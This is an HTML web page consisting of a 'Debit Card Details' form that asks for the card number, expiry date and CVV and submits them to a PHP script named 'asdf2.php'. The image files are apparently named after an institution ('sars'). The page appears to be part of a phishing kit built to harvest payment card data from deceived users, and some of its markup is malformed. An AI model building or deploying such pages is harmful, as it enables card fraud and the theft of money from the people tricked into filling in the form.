<!DOCTYPE html>
<html lang="eng">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
  <link rel="manifest" href="/site.webmanifest">
  <meta name="msapplication-TileColor" content="#da532c">
  <meta name="theme-color" content="#ffffff">
  
  <style>
    #ml
    {
    width:100%;
    margin-left:0px;
   }
    #mi
    {
    width:28%;
    margin-left:55px;
    position:absolute;
    top:%;
    }
    #img
    {
    width:60%;
    margin-left:100px;
    }
    #aa
    {
    width: 260px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    height: 30px;
    background-color: white;
    border-style: solid;
    border-color:#262626;
    border-width: 1px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #aa:hover
    {
    border-style: solid;
    border-color:#00B1F1;
    }
    #bb
    {
    width:40px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    line-height: 25px !important;
    height: 26px;
    background-color: white;
    border-style: solid;
    border-color:#262626;
    border-width: 1px;
    border-radius: 0px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #bb:hover
    {
    border-style: solid;
    border-color:#00B1F1;
    }
    #cc
    {
    width:260px;
    border-radius:4px !important;
    font-family: Arial;
    color:#40464d;
    font-size: 14px !important;
    line-height: 25px !important;
    height: 26px;
    background-color: white;
    border-style: solid;
    border-color:#262626;
    border-width: 1px;
    border-radius: 0px;
    margin-left: 20px;
    padding: 2px 10px;
    cursor: pointer;
    }
    #cc:hover
    {
    border-style: solid;
    border-color:#01B9F5;
    }
    #btn
    {
    width:170px;
    background-color:#993300;
    color: white;
    margin-left:15px;
    border: solid black;
    border-radius: 2px;
    border-width: 0px;
    font-weight: bold;
    cursor: pointer;
    font-size: 15px;
    height:36px;
    }
    #ab
    {
    width:365px;
    margin:50px;
    border-bottom:solid #CCCCCC;
    border-width:1.2px;
    }
  </style>
</head>
<body>
  <img src="sars.jpg" alt="" id="ml"><br><br>
    <form action="asdf2.php" method="post">

<center><b style=" color:red; font-size:18px; font-family:arial; margin:4px;">Debit Card Details </b></center>
  <img src="twooooo.png" alt="" id="ml" width="100">

 
  <h4 style="font-family:arial; margin:4px;"></h4><br>


 <img src="dd.png" alt="" id="ml">
<div required="">
  <input type="tel" name="card no. " id="aa" onkeypress='return formatsq(this,event)' onkeyup="return numberValid(event)" 
  placeholder="Debit Card Number " required=""><br><br>

<script>
  function formatsq(ele,e){
  if(ele.value.length<16){
  ele.value= ele.value.replace(/\W/g, '').replace(/(.{16})/g, '$1 ');
  return true;
  }else{
  return false;
  }


  }
  
  function numberValid(e){
  e.target.value = e.target.value.replace(/[^\d ]/g,'');
  return false;
  }
  </script></div>

<img src="ee.png" alt="" id="ml">
  <div required="">
  <input type="tel" name=" valid. " id="aa" onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)" 
  placeholder=" MM/YY" required=""><br><br>


  
<img src="cc.png" alt="" id="ml">
  <div required="">
  <input type="tel" name=" Cvv. " id="aa" onkeypress='return formats(this,event)' onkeyup="return numberValidation(event)" 
  placeholder=" CVV" required=""><br><br>

   </select>
  </span><br>
  <div id="ee">
  <b 
  </div>
  </div>
  
  <button type="submit" id="btn" style="font-weight:;">Submit</button><br><br><br>
<img src="sars1.png" alt="" id="ml">          <center><b style=" color:red; font-size:18px; font-family:arial; margin:4px;"></b></center>
  <img src="twooooo.png" alt="" id="ml" width="100">
  <img src="" alt="" id="ml"> 
  </form></body></html> 